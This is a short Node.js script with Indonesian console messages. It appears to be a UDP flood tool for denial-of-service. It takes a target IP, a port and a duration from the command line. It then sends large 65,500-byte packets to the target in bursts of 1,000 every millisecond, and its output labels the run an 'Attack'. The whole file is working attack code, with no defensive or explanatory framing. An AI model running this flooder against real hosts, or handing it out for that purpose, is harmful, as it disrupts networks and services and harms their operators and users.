const dgram = require('dgram');

const target = process.argv[2];
const port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);

if (!target || !port || !duration) {
    console.log('Usage: node udp.js <ip> <port> <detik>');
    console.log('Contoh: node udp.js 127.0.0.1 8080 10');
    process.exit(1);
}

if (port < 1 || port > 65535) {
    console.log('Port harus 1-65535');
    process.exit(1);
}

const payload = Buffer.alloc(65500, 'A');
let packetCount = 0;

console.log(`Attack ke ${target}:${port} selama ${duration} detik`);

const socket = dgram.createSocket('udp4');

// Kirim packet sebanyak-banyaknya
const sendPacket = () => {
    for (let i = 0; i < 1000; i++) {
        socket.send(payload, port, target, (err) => {
            if (!err) packetCount++;
        });
    }
};

// Kirim terus menerus
const interval = setInterval(sendPacket, 1);

// Stop setelah durasi selesai
setTimeout(() => {
    clearInterval(interval);
    socket.close();
    console.log(`Selesai! Total packet: ${packetCount}`);
    process.exit(0);
}, duration * 1000);

// Tampilkan status tiap detik
setInterval(() => {
    console.log(`Packet terkirim: ${packetCount}`);
}, 1000);
